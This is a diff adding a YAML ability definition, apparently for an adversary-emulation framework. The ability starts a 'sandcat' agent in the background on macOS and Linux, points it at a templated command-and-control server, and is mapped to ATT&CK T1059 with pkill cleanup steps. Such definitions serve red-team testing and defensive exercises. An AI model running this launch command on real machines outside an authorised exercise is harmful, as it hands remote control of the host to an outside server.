@@ -1,0 +1,22 @@
+---
+
+- id: b1d41972-3ad9-4aa1-8f7f-05f049a2980e
+  name: Start 54ndc47
+  description: Start a new 54ndc47 agent in background
+  tactic: execution
+  technique:
+    attack_id: T1059
+    name: Command-Line Interface
+  executors:
+    darwin:
+      command: |
+        nohup ./sandcat.go -server #{server} &
+      cleanup: |
+        pkill -f sandcat
+      payload: sandcat.go
+    linux:
+      command: |
+        nohup ./sandcat.go -server #{server} &
+      cleanup: |
+        pkill -f sandcat
+      payload: sandcat.go
